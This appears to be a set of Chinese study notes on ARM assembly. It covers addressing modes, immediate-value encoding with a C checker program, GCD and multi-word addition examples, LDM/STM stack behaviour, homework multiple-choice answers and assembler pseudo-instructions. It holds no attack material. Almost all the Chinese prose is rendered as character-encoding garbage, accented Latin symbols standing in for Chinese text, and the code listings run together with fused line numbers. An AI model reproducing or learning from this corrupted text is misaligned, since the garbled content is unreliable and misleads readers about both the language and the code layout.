åç¼€ä¸èƒ½ç”¨äºR15(PC)çš„åé¢ï¼› (3)å½“ç”¨åœ¨å•ä¸ªåœ°å€å¯„å­˜å™¨åé¢æ—¶ï¼Œå¿…é¡»ç¡®ä¿¡è¿™ä¸ªå¯„å­˜å™¨æœ‰éšæ€§çš„åç§»é‡ï¼Œä¾‹å¦‚â€œSTMIA R7!, {R0 â€“ R3}â€æ­¤æ—¶åœ°å€åŸºå€å¯„å­˜å™¨R7çš„éšæ€§åç§»é‡æ˜¯16å­—èŠ‚ã€‚å¦‚æœR7çš„åˆå§‹å€¼ä¸º 0X40000000ï¼Œåˆ™è¯¥è¯­å¥ç»“æŸåä¸º0X40000010 3ï¼‰B åç¼€ Båç¼€çš„å«ä¹‰æ˜¯ï¼šæŒ‡ä»¤æ‰€æ¶‰åŠçš„æ•°æ®æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œä¸æ˜¯ä¸€ä¸ªå­—æˆ–åŠå­—ã€‚ æŒ‡ä»¤çš„æ¡ä»¶ç ARM æŒ‡ä»¤çš„ æ¡ä»¶ç  å’Œ åŠ©è®°ç¬¦ å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼ˆPPT 19 é¡µï¼‰ æŒ‡ä»¤åˆ†ç±»ARM æŒ‡ä»¤å¯ä»¥åˆ†ä¸ºï¼šåˆ†æ”¯æŒ‡ä»¤ã€æ•°æ®å¤„ç†æŒ‡ä»¤ã€å­˜å‚¨è®¿é—®æŒ‡ä»¤ã€åå¤„ç†å™¨æŒ‡ä»¤å’Œæ‚é¡¹æŒ‡ä»¤äº”ç±»ã€‚ ARM æŒ‡ä»¤çš„å¯»å€æ–¹å¼ç«‹å³æ•°å¯»å€12ADD R0, R0, #1; R0 &lt;- R0+1MOV R0, #15; R0 &lt;- 15 å¾ªç¯å³ç§»ï¼Œ8ä½ä½å›¾ã€‚éœ€ç¡®è®¤ç«‹å³æ•°æ˜¯å¦å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ª 8 ä½å€¼ï¼ˆ0x00 åˆ° 0xFFï¼Œåè¿›åˆ¶ 0 åˆ° 255ï¼‰ã€‚ ARM æ¶æ„çš„ç«‹å³æ•°ç¼–ç è§„åˆ™ï¼ˆä¸€ç§å¸¸è§çš„å½¢å¼ï¼‰ï¼š è®¸å¤š ARM æŒ‡ä»¤ä¸­çš„ç«‹å³æ•°å¹¶ä¸æ˜¯ç›´æ¥ä½¿ç”¨ä¸€ä¸ªå›ºå®šçš„ä½æ•°ï¼ˆæ¯”å¦‚ 16 ä½æˆ– 32 ä½ï¼‰æ¥è¡¨ç¤ºã€‚ç›¸åï¼Œå®ƒä»¬é€šå¸¸ç”±ä¸€ä¸ª 8 ä½çš„å¸¸æ•° (immed_8) å’Œä¸€ä¸ª 4 ä½çš„å¾ªç¯å³ç§»å€¼ (rotate_imm) ç»„æˆã€‚æœ€ç»ˆçš„ 32 ä½ç«‹å³æ•°æ˜¯é€šè¿‡å°†è¿™ä¸ª 8 ä½å¸¸æ•°ï¼ˆé›¶æ‰©å±•åˆ° 32 ä½ï¼‰å¾ªç¯å³ç§» 2 * rotate_imm ä½ å¾—åˆ°çš„ã€‚ è¿™æ„å‘³ç€ï¼Œåªæœ‰é‚£äº›å¯ä»¥é€šè¿‡å°†ä¸€ä¸ª 0 åˆ° 255 ä¹‹é—´çš„ 8 ä½æ•°å€¼å¾ªç¯å³ç§»å¶æ•°ä½ï¼ˆ0, 2, 4, â€¦, 30 ä½ï¼‰å¾—åˆ°çš„ 32 ä½æ•°å€¼ï¼Œæ‰æ˜¯â€œåˆæ³•â€çš„ç«‹å³æ•°ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;uint32_t rot(uint32_t value, unsigned int shift) { shift &amp;= 31; if (shift == 0) { return value; } return (value &gt;&gt; shift) | (value &lt;&lt; (32 - shift));}int get_arm_immediate_params(uint32_t num, uint8_t *immed_8_ptr, uint8_t *rotate_imm_ptr) { for (int r = 0; r &lt; 16; r++) { uint32_t rotated = rot(num, r * 2); if ((rotated &amp; ~0xFFU) == 0) { *immed_8_ptr = (uint8_t)rotated; *rotate_imm_ptr = (uint8_t)r; return 1; } } return 0;}int main() { uint32_t K; uint8_t immed_8_val; uint8_t rotate_imm_val; printf(&quot;è¯·è¾“å…¥ä¸€ä¸ªåå…­è¿›åˆ¶æ•°: &quot;); if (scanf(&quot;%x&quot;, &amp;K) != 1) { fprintf(stderr, &quot;è¾“å…¥é”™è¯¯ï¼Œéœ€è¦ä¸€ä¸ªæœ‰æ•ˆçš„åå…­è¿›åˆ¶æ•°ã€‚\\n&quot;); return 2; } int result = get_arm_immediate_params(K, &amp;immed_8_val, &amp;rotate_imm_val); if (result == 1) { printf(&quot;è¾“å…¥å€¼ 0x%X æ˜¯ ARM ç«‹å³æ•°ã€‚\\n&quot;, K); printf(&quot; 8 ä½ç«‹å³æ•° (immed_8) : 0x%02X\\n&quot;, immed_8_val); printf(&quot; 4 ä½å¾ªç¯å³ç§»é‡ (rotate_imm): %u\\n&quot;, rotate_imm_val); printf(&quot; (å®é™…å³ç§»ä½æ•° : %u)\\n&quot;, rotate_imm_val * 2); } else { printf(&quot;è¾“å…¥å€¼ 0x%X ä¸æ˜¯ ARM ç«‹å³æ•°ã€‚\\n&quot;, K); printf(&quot;0\\n&quot;); } return 0;} MOV R0ï¼Œ#0xF200 ;E3A00CF2. 0xF200 =0xF2 ROR(2*Cï¼‰ åªæœ‰èƒ½å¤Ÿé€šè¿‡æ­¤æ„é€ æ–¹æ³•å¾—åˆ°çš„æ‰æ˜¯åˆæ³•çš„ç«‹å³æ•°ã€‚ å¯„å­˜å™¨å¯»å€12MOV R1, R2; R1 &lt;- R2ADD R1, R1, R2; R1 &lt;- R1+R2 å¯„å­˜å™¨ç§»ä½å¯»å€12ADD R3, R2, R1, LSR #2; R3 &lt;- R2+(R1å³ç§»2ä½)ADD R3, R2, R1, LSR R0; R3 &lt;- R2+(R1å³ç§»R0ä½) å¯„å­˜å™¨é—´æ¥å¯»å€1LDR R0, [R4]; R0 &lt;- [R4] åŸºå€å˜å€å¯»å€1LDR R0, [R1, #4]; R0 &lt;- mem32[R1+4] å¤šå¯„å­˜å™¨å¯»å€1LDMIA R0ï¼ï¼Œ{R1-R4} ï¼›R1â†[R0]ã€R2â†[R0ï¼‹4]ã€R3â†[R0ï¼‹8]ã€R4â†[R0ï¼‹12] æ³¨æ„ï¼šå¯¹äºæ‰€æœ‰LDM/STMæŒ‡ä»¤è€Œè¨€ï¼Œå¯„å­˜å™¨åºå·ä½çš„ï¼Œåœ¨ä½åœ°å€å•å…ƒï¼Œåºå·å¤§çš„åœ¨é«˜åœ°å€å•å…ƒï¼ä¸ä¹¦å†™é¡ºåºæ— å…³ï¼ å †æ ˆå¯»å€å‘ä¸Šç”Ÿé•¿ï¼šå‘é«˜åœ°å€æ–¹å‘ç”Ÿé•¿ï¼Œç§°ä¸ºé€’å¢å †æ ˆã€‚ STMXXæ˜¯å­˜å…¥åˆ°ä¸»å­˜ï¼Œæ˜¯å…¥æ ˆæ“ä½œï¼› LDMXXæ˜¯ä»ä¸»å­˜è¯»å‡ºåˆ°å¯„å­˜å™¨ï¼Œæ˜¯å‡ºæ ˆæ“ä½œã€‚ ç›¸å¯¹å¯»å€ARM æŒ‡ä»¤é›†åˆ†æ”¯æŒ‡ä»¤å†™æ±‡ç¼–ç¨‹åºæ—¶ï¼Œå¯ä»¥è·³è½¬åˆ°ä¸€ä¸ªç»å¯¹åœ°å€ï¼Œå¦‚: 1B 0x1234 æ³¨ï¼š B #0x1234æ˜¯é”™è¯¯çš„ ä¾‹ï¼šå·²çŸ¥å¯„å­˜å™¨ R0 ä¸­å­˜æ”¾äº†æ•°æ® aï¼Œå¯„å­˜å™¨ R1 ä¸­å­˜æ”¾äº†æ•°æ® bï¼Œç¼–å†™ä¸€ä¸ªç¨‹åºæ®µï¼Œæ±‚å– a å’Œ b çš„æœ€å¤§å…¬çº¦æ•°å¹¶å°†å…¶å­˜å…¥å¯„å­˜å™¨ R0ã€‚ å…ˆå†™ä¸€ä¸ª C è¯­è¨€ç‰ˆæœ¬çš„ï¼š 1234567891011int gcd(int a, int b) { while (a != b) { if (a &gt; b) { a = a - b; } else { b = b - a; } } return a;} è½¬æ¢æˆå¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤ï¼š 123456gcdCMP R0, R1SUBGT R0, R0, R1SUBLT R1, R1, R0BNE gcdMOV PC LR Bå’ŒBLçš„åŒºåˆ«åœ¨äºï¼šBLåœ¨è·³è½¬ä¹‹å‰ä¼šæŠŠBLæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆæ–­ç‚¹åœ°å€ï¼‰ä¿å­˜åˆ°è¿æ¥å¯„å­˜å™¨ LRï¼ˆR14ï¼‰ï¼Œå› æ­¤ç¨‹åºåœ¨å¿…è¦çš„æ—¶å€™å¯ä»¥é€šè¿‡å°† LR çš„å†…å®¹åŠ è½½åˆ° PC ä¸­ï¼Œä½¿ç¨‹åºè¿”å›åˆ°è·³è½¬ç‚¹ã€‚ BL æŒ‡ä»¤ç»å¸¸è¢«ç”¨æ¥è°ƒç”¨ä¸€ä¸ªå­ç¨‹åºã€‚ BX åŠŸèƒ½ï¼šè·³è½¬åˆ°æŒ‡ä»¤ä¸­æ‰€æŒ‡å®šçš„ç›®æ ‡åœ°å€ï¼Œå¹¶å®ç°çŠ¶æ€åˆ‡æ¢ã€‚ BLX æŒ‡ä»¤çš„åŠŸèƒ½æ˜¯ï¼šæŠŠç¨‹åºè·³è½¬åˆ°æŒ‡ä»¤ä¸­æ‰€æŒ‡å®šçš„ç›®æ ‡åœ°å€ç»§ç»­æ‰§è¡Œï¼Œå¹¶åŒæ—¶å°†å¤„ç†å™¨çš„å·¥ä½œçŠ¶æ€ä»ARMçŠ¶æ€åˆ‡æ¢åˆ°ThumbçŠ¶æ€ï¼Œå¹¶å°†ä¸‹ä¸€æ¡çš„åœ°å€ä¿å­˜åˆ°å¯„å­˜å™¨ LR ä¸­ã€‚ 1234567891011121314151617 ; ä¸»ç¨‹åº MOV R0, #48 ; ç¤ºä¾‹è¾“å…¥ï¼šR0 = 48 MOV R1, #18 ; ç¤ºä¾‹è¾“å…¥ï¼šR1 = 18 BL gcd ; è°ƒç”¨ gcd å­ç¨‹åº ; ç»“æœåœ¨ R0 ä¸­ï¼ˆè¿™é‡Œæ˜¯ 6ï¼‰ B end ; è·³è½¬åˆ°ç¨‹åºç»“æŸgcd: CMP R0, R1 ; æ¯”è¾ƒ R0 å’Œ R1 SUBGT R0, R0, R1 ; å¦‚æœ R0 &gt; R1ï¼Œåˆ™ R0 = R0 - R1 SUBLT R1, R1, R0 ; å¦‚æœ R1 &gt; R0ï¼Œåˆ™ R1 = R1 - R0 BNE gcd ; å¦‚æœ R0 != R1ï¼Œç»§ç»­å¾ªç¯ BX LR ; è¿”å›åˆ°è°ƒç”¨è€…ï¼ˆä½¿ç”¨ BX LR æ›¿ä»£ MOV PC, LRï¼‰end: ; ç¨‹åºç»“æŸï¼ˆå¯ä»¥æ·»åŠ åœæ­¢æŒ‡ä»¤ï¼Œå¦‚æ­»å¾ªç¯ï¼‰ B end æ•°æ®å¤„ç†æŒ‡ä»¤ä¸»è¦å®Œæˆå¯„å­˜å™¨ä¸­æ•°æ®çš„ç®—æœ¯å’Œé€»è¾‘è¿ç®—æ“ä½œã€‚ æ“ä½œæ•°æ¥æºï¼šæ‰€æœ‰çš„æ“ä½œæ•°è¦ä¹ˆæ¥è‡ªå¯„å­˜å™¨ï¼Œè¦ä¹ˆæ¥è‡ªç«‹å³æ•°ï¼Œä¸ä¼šæ¥è‡ªå­˜å‚¨å™¨ã€‚ æ“ä½œç»“æœï¼šå¦‚æœæœ‰ç»“æœï¼Œåˆ™ç»“æœä¸€å®šæ˜¯ä¸º32ä½å®½ã€æˆ–64ä½å®½ï¼ˆé•¿ä¹˜æ³•æŒ‡ä»¤ï¼‰ï¼Œå¹¶ä¸”æ”¾åœ¨ä¸€ä¸ªæˆ–ä¸¤ä¸ªå¯„å­˜å™¨ä¸­ï¼Œä¸ä¼šå†™å…¥å­˜å‚¨å™¨ã€‚ æœ‰ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼ˆé™¤äº†ä¹˜æ³•æŒ‡ä»¤ï¼‰ Operand2 ï¼šåˆ‡è®°å…¶ä¸‰ç§å½¢å¼ï¼šç«‹å³æ•°ã€å¯„å­˜å™¨ã€å¯„å­˜å™¨ç§»ä½ã€‚ ä¹˜æ³•æŒ‡ä»¤çš„æ“ä½œæ•°ï¼šå…¨éƒ¨æ˜¯å¯„å­˜å™¨ã€‚ æŒ‡ä»¤ä¸­å¯ä»¥é€‰æ‹©såç¼€ï¼Œä»¥å½±å“çŠ¶æ€æ ‡å¿—ã€‚ä½†æ˜¯æ¯”è¾ƒæŒ‡ä»¤ï¼ˆCMPå’ŒCMNï¼‰å’Œæµ‹è¯•æŒ‡ä»¤(TSTå’ŒTEQ)ä¸éœ€è¦åç¼€Sï¼Œå®ƒä»¬æ€»ä¼šç›´æ¥å½±å“CPSRä¸­çš„çŠ¶æ€æ ‡å¿—ã€‚ ADCâ€”â€”å¸¦è¿›ä½åŠ æ³•æŒ‡ä»¤ï¼šADCæŒ‡ä»¤å°†operand2çš„æ•°æ®ä¸Rnçš„å€¼ç›¸åŠ ï¼Œå†åŠ ä¸ŠCPSRä¸­çš„Cæ¡ä»¶æ ‡å¿—ä½ï¼Œç»“æœä¿å­˜åˆ°Rdå¯„å­˜å™¨ã€‚ ä¾‹ï¼šæœ‰ ä¸¤ä¸ª128ä½æ•°ï¼Œç¬¬ä¸€ä¸ªæ•°ç”±é«˜åˆ°ä½å­˜æ”¾åœ¨å¯„å­˜å™¨R7â€”R4 ä¸­ï¼Œç¬¬äºŒä¸ªæ•°ç”±é«˜åˆ°ä½å­˜æ”¾åœ¨å¯„å­˜å™¨ R11â€”R8 ä¸­ï¼Œ è¯·ç¼–å†™ç¨‹åºæŠŠä¸¤ä¸ªæ•°ç›¸åŠ ï¼Œè¿ç®—ç»“æœç”±é«˜åˆ°ä½å­˜æ”¾åˆ°å¯„å­˜å™¨R3~R0ä¸­ã€‚ 1234ADDS R0ï¼ŒR4ï¼ŒR8 ï¼›åŠ ä½ä½å­—ï¼Œä¸å¸¦è¿›ä½ADCS R1ï¼ŒR5ï¼ŒR9 ï¼›åŠ ç¬¬äºŒä¸ªå­—ï¼Œå¸¦è¿›ä½ADCS R2ï¼ŒR6ï¼ŒR10 ï¼›åŠ ç¬¬ä¸‰ä¸ªå­—ï¼Œå¸¦è¿›ä½ADCS R3ï¼ŒR7ï¼ŒR11 ï¼›åŠ ç¬¬å››ä¸ªå­—ï¼Œå¸¦è¿›ä½ SBCâ€”â€”å¸¦è¿›ä½å‡æ³•æŒ‡ä»¤ï¼ˆ81ï¼‰ CMP å­˜å‚¨å™¨è®¿é—®æŒ‡ä»¤åŸºæœ¬çš„åŠ è½½/å­˜å‚¨æŒ‡ä»¤ä»…æœ‰5æ¡ï¼Œåˆ†ä¸º3ç§ï¼š â€” LDRå’ŒSTRï¼Œå•å¯„å­˜å™¨åŠ è½½/å­˜å‚¨æŒ‡ä»¤ â€” LDMå’ŒSTMï¼Œå¤šå¯„å­˜å™¨åŠ è½½/å­˜å‚¨æŒ‡ä»¤ â€” SWPï¼Œå¯„å­˜å™¨å’Œå­˜å‚¨å™¨æ•°æ®äº¤æ¢æŒ‡ä»¤ PCï¼ˆå³R15ï¼‰ å·²çŸ¥ï¼ˆR0ï¼‰=0X00000000å’Œï¼ˆR1ï¼‰=0X00009000ï¼Œå¹¶å·²çŸ¥åœ¨å­˜å‚¨å™¨ä¸­é¦–åœ°å€ä¸º 0X00009000 çš„åŒºåŸŸä¸­å­˜æ”¾äº†æ•° æ®0X01010101ï¼Œåœ¨é¦–åœ°å€ä¸º 0X00009004 çš„åŒºåŸŸå­˜æ”¾äº†æ•°æ® 0X02020202ã€‚ è¯•å†™å‡ºæ‰§è¡Œäº†æŒ‡ä»¤ LDR R0ï¼Œ[R1ï¼Œ#4] åR0 å’Œ R1 ä¸­çš„æ•°æ®ã€‚ ï¼ˆR0ï¼‰= 0X02020202 ï¼ˆR1ï¼‰= 0X00009000 è¯•å†™å‡ºæ‰§è¡Œäº†æŒ‡ä»¤ LDR R0ï¼Œ[R1ï¼Œ#4]ï¼åçš„ R0 å’Œ R1 ä¸­çš„æ•°æ®ã€‚ ï¼ˆR0ï¼‰= 0X02020202 ï¼ˆR1ï¼‰=0X00009004 åå¤„ç†å™¨æŒ‡ä»¤ï¼ˆäº†è§£ï¼‰æ‚é¡¹æŒ‡ä»¤ä¾‹é¢˜ï¼š ä¸€ã€ç®—æ•°é€»è¾‘è¿ç®—æŒ‡ä»¤çš„åº”ç”¨ ä¾‹2ï¼š64ä½æ•°æ®è¿ç®— å‡è®¾R0å’ŒR1å­˜æ”¾ä¸€ä¸ª64ä½æ•°æ®ï¼ŒR0ä¸­å­˜æ”¾æ•°æ®çš„ä½32ä½ï¼›R2å’ŒR3ä¸­å­˜æ”¾å¦ä¸€ä¸ª64ä½æ•°æ®ï¼ŒR2ä¸­å­˜æ”¾æ•°æ®çš„ä½32ä½ã€‚å¯¹è¿™ä¸¤ä¸ª64ä½æ•°è¿›è¡ŒåŠ ã€å‡å’Œæ¯”è¾ƒè¿ç®—ã€‚ï¼ˆR1ï¼ŒR0ï¼‰ã€ï¼ˆR3ï¼ŒR2ï¼‰ â‘ ä¸¤ä¸ª64ä½æ•°æ®çš„åŠ æ³•è¿ç®—ï¼Œç»“æœä¿å­˜åˆ°R0å’ŒR1ä¸­ã€‚ 12ADDS R0, R0, R2 ;ä½32ä½ç›¸åŠ ï¼Œè®¾ç½®CPSRçš„Cæ ‡å¿—ä½ã€‚ADC R1, R1, R3 ;é«˜32ä½çš„å¸¦ä½ç›¸åŠ  â‘¡ä¸¤ä¸ª64ä½æ•°æ®çš„å‡æ³•è¿ç®—ï¼Œç»“æœä¿å­˜åˆ°R0å’ŒR1ä¸­ã€‚ 12SUBS R0, R0, R2 ;ä½32ä½ç›¸å‡ï¼Œè®¾ç½®CPSRçš„Cæ ‡å¿—ä½ã€‚SBC R1, R1, R3 ;é«˜32ä½çš„å¸¦ä½ç›¸å‡ â‘¢ä¸¤ä¸ª64ä½æ•°æ®çš„æ¯”è¾ƒæ“ä½œï¼Œå¹¶è®¾ç½®CPSRä¸­çš„æ¡ä»¶æ ‡å¿—ä½ã€‚ 12CMP R1, R3 ;æ¯”è¾ƒé«˜32ä½CMPEQ R0, R2 ;å¦‚æœé«˜32ä½ç›¸ç­‰ï¼Œæ¯”è¾ƒä½32ä½ ä¾‹3ï¼šè½¬æ¢å†…å­˜ä¸­æ•°æ®å­˜å‚¨æ–¹å¼ å°†å¯„å­˜å™¨R0ä¸­çš„æ•°æ®å­˜å‚¨æ–¹å¼è½¬æ¢æˆå¦ä¸€ç§å­˜å‚¨æ–¹å¼ã€‚æŒ‡ä»¤æ‰§è¡Œå‰R0ä¸­æ•°æ®å­˜å‚¨æ–¹å¼ä¸ºï¼šR0=A,B,C,Dï¼›æŒ‡ä»¤æ‰§è¡ŒåR0ä¸­æ•°æ®å­˜å‚¨æ–¹å¼ä¸ºï¼šR0=D,C,B,Aã€‚ äºŒã€è·³è½¬æŒ‡ä»¤çš„åº”ç”¨ ä¾‹3ï¼šå¾ªç¯è¯­å¥ å°†å†…å­˜ä¸­ä»0x400800å¼€å§‹çš„100ä¸ªå­—æ•°æ®ç›¸åŠ ï¼Œå…¶ç»“æœå­˜äºR3ã€R2ä¸­ï¼ˆR3ä¸­ä¸ºé«˜32ä½ï¼‰ã€‚ 12345678910 LDR R0, =0x400800 MOV R1, #100 ;å¾ªç¯è®¡æ•°å™¨ MOV R2, #0 ;ç”¨äºä½32ä½ç´¯åŠ  MOV R3, #0 ;ç”¨äºé«˜32ä½ç´¯åŠ loop LDR R4, [R0], #4 ADDS R2, R2, R4 ADC R3, R3, #0 SUBS R1, R1, #1 BNE loop;å¾ªç¯è®¡æ•°å™¨ä¸ä¸º0,è·³åˆ°loopç»§ç»­æ‰§è¡Œ ä¾‹4ï¼šé“¾è¡¨æ“ä½œä¸­çš„æ¡ä»¶ç åº”ç”¨ åœ¨é“¾è¡¨ä¸­æœç´¢ä¸æŸä¸€æ•°æ®ç›¸ç­‰çš„å…ƒç´ ã€‚ é“¾è¡¨çš„æ¯ä¸ªå…ƒç´ åŒ…æ‹¬ä¸¤ä¸ªå­—ï¼Œç¬¬1ä¸ªå­—ä¸­åŒ…å«ä¸€ä¸ªå­—èŠ‚æ•°æ®ï¼›ç¬¬2ä¸ªå­—ä¸­åŒ…å«æŒ‡å‘ä¸‹ä¸€ä¸ªé“¾è¡¨å…ƒç´ çš„æŒ‡é’ˆï¼Œå½“è¿™ä¸ªæŒ‡é’ˆä¸º0æ—¶è¡¨ç¤ºé“¾è¡¨ç»“æŸã€‚ ä»£ç æ‰§è¡Œå‰R0æŒ‡å‘é“¾è¡¨çš„å¤´å…ƒç´ ï¼ŒR1ä¸­å­˜æ”¾å°†è¦æœç´¢çš„æ•°æ®ï¼›ä»£ç æ‰§è¡ŒåR0æŒ‡å‘ç¬¬1ä¸ªåŒ¹é…çš„å…ƒç´ ï¼Œæˆ–è€…å½“æ²¡æœ‰åŒ¹é…å…ƒç´ æ—¶ï¼ŒR0ä¸º0ã€‚ 1234567SEARCH CMP R0,#0 ;R0æŒ‡é’ˆæ˜¯å¦ä¸ºç©º LDRNEB R2,[R0] ;è¯»å–å½“å‰å…ƒç´ ä¸­çš„å­—èŠ‚æ•°æ® CMPNE R1,R2 ;åˆ¤æ–­æ•°æ®æ˜¯å¦ä¸ºæœç´¢çš„æ•°æ® LDRNE R0,[R0,#4] ;å¦‚æœä¸æ˜¯,æŒ‡é’ˆR0æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´  BNE SEARCH ;è·³è½¬åˆ°searchæ‰§è¡Œ MOV PC,LR ;æœç´¢å®Œæˆï¼Œç¨‹åºè¿”å› ä½œä¸šé¢˜ï¼š ä¸€ã€ARM æŒ‡ä»¤åˆ†ä¸ºå‡ ç±»ï¼Ÿåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ ARM æŒ‡ä»¤æœ‰äº”ç±»ï¼šåˆ†æ”¯æŒ‡ä»¤ã€æ•°æ®å¤„ç†æŒ‡ä»¤ã€å­˜å‚¨è®¿é—®æŒ‡ä»¤ã€åå¤„ç†å™¨æŒ‡ä»¤å’Œæ‚é¡¹æŒ‡ä»¤äº”ç±»ã€‚ äºŒã€ARM æŒ‡ä»¤æœ‰å‡ ç§å¯»å€æ–¹å¼ï¼Ÿåˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Ÿ ARM æŒ‡ä»¤æœ‰å…«ç§å¯»å€æ–¹å¼ï¼šç«‹å³æ•°å¯»å€ã€å¯„å­˜å™¨å¯»å€ã€å¯„å­˜å™¨ç§»ä½å¯»å€ã€å¯„å­˜å™¨é—´æ¥å¯»å€ã€åŸºå€å˜å€å¯»å€ã€å¤šå¯„å­˜å™¨å¯»å€ã€å †æ ˆå¯»å€ã€ç›¸å¯¹å¯»å€ã€‚ ä¸‰ã€å•é€‰ ä¸‹åˆ—æŒ‡ä»¤åˆæ³•çš„æ˜¯ï¼ˆ B ï¼‰8ä½ä½å›¾ Aï¼MOV R0,#0x132 Bï¼MOV R0,#0x264 Cï¼MOV R0,#0x266 Dï¼MOV R0,#0x4C8 æ±‡ç¼–æŒ‡ä»¤ MOV R0,#0x4800, ç»ç¼–è¯‘åï¼Œæ‰€å¾—åˆ°çš„æœºå™¨ç çš„ä½ 12 ä½æ˜¯ï¼ˆ A ï¼‰ Aï¼0xB12 Bï¼0xB24 Cï¼0xA09 Dï¼0xC48 å‡è®¾ R1 å¯„å­˜å™¨ä¸­çš„å€¼ä¸º ADRï¼Œåˆ™åœ¨æ‰§è¡Œäº†æŒ‡ä»¤ï¼šSTMIA R1!, {R3-R5,R8} æŒ‡ä»¤åï¼ŒR1 çš„ å†…å®¹ä¸ºï¼ˆ A ï¼‰ã€‚ Aã€R1=ADR+16 Bã€R1=ADR+12 Cã€R1=ADR-16 Dã€R1=ADR-12 å‡è®¾ R1 å¯„å­˜å™¨ä¸­çš„å€¼ä¸º ADRï¼Œåˆ™åœ¨æ‰§è¡Œäº†æŒ‡ä»¤ï¼šSTMDB R1!, {R3-R5,R8} æŒ‡ä»¤åï¼ŒR5 å¯„å­˜å™¨ä¸­çš„å†…å®¹å°†å­˜æ”¾åœ¨åœ°å€ä¸ºï¼ˆ B ï¼‰çš„å­˜å‚¨å•å…ƒä¸­ï¼š Aã€ADR-4 Bã€ADR-8 Cã€ADR-12 Dã€ADR-16 å‡è®¾ SP å¯„å­˜å™¨ä¸­çš„å€¼ä¸º ADRï¼Œåˆ™åœ¨æ‰§è¡Œäº†æŒ‡ä»¤ï¼šSTMED SP!, {R3-R5,LR} æŒ‡ä»¤åï¼ŒSP çš„ å†…å®¹ä¸ºï¼ˆ C ï¼‰ã€‚ Aã€ADR+16 Bã€ADR+12 Cã€ADR-16 Dã€ADR-12 å‡è®¾ SP å¯„å­˜å™¨ä¸­çš„å€¼ä¸º ADRï¼Œåˆ™åœ¨æ‰§è¡Œäº†æŒ‡ä»¤ï¼šSTMED SP!, {R3-R5,LR} æŒ‡ä»¤åï¼ŒLR å¯„ å­˜å™¨ä¸­çš„å†…å®¹å°†å­˜æ”¾åœ¨åœ°å€ä¸ºï¼ˆ A ï¼‰çš„å­˜å‚¨å•å…ƒä¸­ã€‚ Aã€ADR Bã€ADR-4 Cã€ADR-12 Dã€ADR-16 å‡è®¾ SP å¯„å­˜å™¨ä¸­çš„å€¼ä¸º ADRï¼Œåˆ™åœ¨æ‰§è¡Œäº†æŒ‡ä»¤ï¼šLDMEA SP!, {R3-R5,PC} æŒ‡ä»¤åï¼Œåœ° å€ä¸ºï¼ˆ B ï¼‰çš„å­˜å‚¨å•å…ƒçš„å€¼ï¼Œå°†å‡ºæ ˆåˆ° PC å¯„å­˜å™¨ä¸­ã€‚ Aã€ADR Bã€ADR-4 Cã€ADR-12 Dã€ADR-16 ARM ä¼ªæŒ‡ä»¤åŠç¼–ç¨‹åŸºç¡€ ä»€ä¹ˆæ˜¯ä¼ªæŒ‡ä»¤ï¼Ÿ äººä»¬è®¾è®¡äº†ä¸€äº›ä¸“é—¨ç”¨äºæŒ‡å¯¼æ±‡ç¼–å™¨è¿›è¡Œæ±‡ç¼–å·¥ä½œçš„æŒ‡ä»¤ï¼Œç”±äºè¿™äº›æŒ‡ä»¤ä¸å½¢æˆæœºå™¨ç æŒ‡ä»¤ï¼Œå®ƒä»¬åªæ˜¯åœ¨æ±‡ç¼–å™¨è¿›è¡Œæ±‡ç¼–å·¥ä½œçš„è¿‡ç¨‹ä¸­èµ·ä½œç”¨ï¼Œæ‰€ä»¥è¢«å«åšä¼ªæŒ‡ä»¤ã€‚ ä¼ªæŒ‡ä»¤æœ‰ä¸¤ä¸ªç‰¹å¾ï¼šâ‘ ä¼ªæŒ‡ä»¤æ˜¯ä¸€æ¡æŒ‡ä»¤ï¼›â‘¡ä¼ªæŒ‡ä»¤æ²¡æœ‰æŒ‡ä»¤ä»£ç ã€‚ ä¼ªæŒ‡ä»¤çš„ä½œç”¨ï¼šâ‘ ç¨‹åºå®šä½çš„ä½œç”¨ï¼›â‘¡ä¸ºéæŒ‡ä»¤ä»£ç è¿›è¡Œå®šä¹‰ï¼›â‘¢å¯¹ç¨‹åºå®Œæ•´æ€§åšæ ‡æ³¨ï¼›â‘£æœ‰æ¡ä»¶çš„å¼•å¯¼ç¨‹åºæ®µã€‚ é€šç”¨ä¼ªæŒ‡ä»¤åœ¨ ARM æ±‡ç¼–ç¨‹åºè¯­è¨€ä¸­ï¼Œæœ‰å¦‚ä¸‹å‡ ç§ä¼ªæŒ‡ä»¤ï¼š ç¬¦å·å®šä¹‰ æ•°æ®å®šä¹‰ æ±‡ç¼–æ§åˆ¶ å…¶å®ƒ ä¸ºå˜é‡å®šä¹‰æˆ–èµ‹å€¼çš„ä¼ªæŒ‡ä»¤ä¸€ã€å£°æ˜å…¨å±€å˜é‡ä¼ªæŒ‡ä»¤ GBLAã€GBLLå’ŒGBLS GBLA å®šä¹‰ä¸€ä¸ª å…¨å±€æ•°å­—å˜é‡ï¼Œå…¶é»˜è®¤åˆå€¼ä¸º 0 ï¼› GBLL å®šä¹‰ä¸€ä¸ª å…¨å±€é€»GBLS å®šä¹‰ä¸€ä¸ª å…¨å±€å­—ç¬¦ä¸²å˜é‡ï¼Œå…¶é»˜è®¤åˆå€¼ä¸º ç©º ï¼›è¾‘å˜é‡ ï¼Œå…¶é»˜è®¤åˆå€¼ä¸º FALSEï¼ˆå‡ï¼‰ï¼› äºŒã€å£°æ˜å±€éƒ¨å˜é‡ä¼ªæŒ‡ä»¤LCLAã€LCLLå’ŒLCLS LCLAã€LCLLå’ŒLCLSä¼ªæŒ‡ä»¤ç”¨äºå®šä¹‰ä¸€ä¸ªARMç¨‹åºä¸­çš„å±€éƒ¨å˜é‡ï¼Œå¹¶å°†å…¶åˆå§‹åŒ–ã€‚ LCLA å®šä¹‰ä¸€ä¸ªå±€éƒ¨æ•°å­—å˜é‡ï¼Œå…¶é»˜è®¤åˆå€¼ä¸º 0ï¼›LCLL å®šä¹‰ä¸€ä¸ªå±€éƒ¨é€»è¾‘å˜é‡ï¼Œå…¶é»˜è®¤åˆå€¼ä¸º 